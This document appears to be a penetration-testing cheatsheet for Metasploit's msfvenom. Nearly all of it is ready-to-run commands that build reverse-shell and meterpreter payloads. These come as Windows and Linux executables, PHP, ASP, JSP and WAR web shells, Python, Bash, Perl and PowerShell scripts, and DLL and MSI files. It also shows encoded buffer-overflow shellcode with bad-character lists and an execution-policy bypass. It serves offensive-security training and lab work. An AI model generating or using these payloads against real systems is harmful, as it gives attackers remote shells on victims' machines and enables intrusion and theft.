# MSFVenom Cheatsheet
```default
      o O o                   
              o O             
                 o            
 |^^^^^^^^^^^^^^|l___         
 |    PAYLOAD     |""\___,    
 |________________|__|)__|    
  (@)(@)"""**|(@)(@)**|(@)    
   __  __  _____ ________      __                        
  |  \/  |/ ____|  ____\ \    / /                        
  | \  / | (___ | |__   \ \  / /__ _ __   ___  _ __ ___  
  | |\/| |\___ \|  __|   \ \/ / _ \ '_ \ / _ \| '_ ` _ \ 
  | |  | |____) | |       \  /  __/ | | | (_) | | | | | |
  |_|  |_|_____/|_|        \/ \___|_| |_|\___/|_| |_| |_|
```

The payloads with "(no stages)" can be received with a regular netcat listener. The meterpreter or staged payloads require Metasploit's "multi/handler" module.

## Windows (no stages)
```bash
# Win x86
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

# Win x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Windows (meterpreter)

```bash
# Win x86 staged
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

# Win x64 staged
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

# Win x86 stageless
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

# Win x64 stageless
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Linux (no stages)
```bash
# Linux x86
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Linux (meterpreter)
```bash
# Linux x86 staged
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

# Linux x64 staged
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

# Linux x86 stageless
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

# Linux x64 stageless
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Web Reverse Shells

```bash
# PHP
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

# ASP
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

## Script Reverse Shells

```bash
# Python
# you will have to strip off the python command in the resulting file
msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl

# Powershell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 -f psh -o psshell.ps1
#cmd> powershell.exe -ExecutionPolicy Bypass -File psshell.ps1
```

## DLL
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f dll -o hackedlib.dll
```

## MSI
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f msi -o reverse.msi
```

## Binary exploitation

```bash
# find a suitable payload
msfvenom -l payloads

# find suitable encoders
msfvenom -l encoders
```

Basic BOF Example:
```bash
# generate payload
# at the end there are the badchars
# use EXITFUNC=thread after LPORT=4444 if you want the application to resume afterwards
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f py –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Manage exit behavior with exit function:
```bash
# Thread exit function (allow process to continue after exploit)
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f py –e x86/shikata_ga_nai -b "\x00" EXITFUNC=thread

# Process exit function (use when using multi/handler or when )
EXITFUNC=process

# structured exception handler
EXITFUNC=seh

# None
EXITFUNC=none
```

Pop calc:
```bash
msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f c
```

## References

* https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
* https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
* https://www.offensive-security.com/metasploit-unleashed/msfvenom/